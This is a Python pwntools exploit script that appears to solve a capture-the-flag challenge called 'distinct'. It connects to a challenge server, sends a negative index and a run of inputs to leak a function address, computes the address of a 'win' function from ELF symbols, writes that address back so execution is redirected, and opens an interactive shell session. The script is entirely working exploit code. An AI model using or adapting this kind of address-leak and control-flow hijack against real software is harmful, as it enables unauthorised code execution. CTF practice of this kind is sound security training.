#!/usr/bin/env python3

from pwn import *


SERVER = "challs1.nusgreyhats.org"
PORT = 5000
elf = ELF('distinct.o')
offset = elf.sym.win - elf.sym.unique
print(offset)

def exploit():
    p.sendline('-1');
    for i in range(15):
        p.clean()
        p.sendline(str(i))

    p.recvuntil('14')
    uniqAddr = int(p.recvline().lstrip().rstrip())

    log.info(f'{uniqAddr = }')

    winAddr = uniqAddr + offset

    p.sendline('Y')
    p.clean()
    p.sendline(str(winAddr))
    for i in range(15):
        p.clean()
        p.sendline(str(i))

    p.interactive()


def start_exploit(binary):
    """
    Connect to the server or binary and call the exploit.
    If given a local binary to exploit, run the exploit locally.
    Otherwise, connect to a remote server.
    """
    global p
    p = process(binary) if binary else remote(SERVER, PORT)

    exploit()

# start_exploit('./distinct.o')
start_exploit(False)
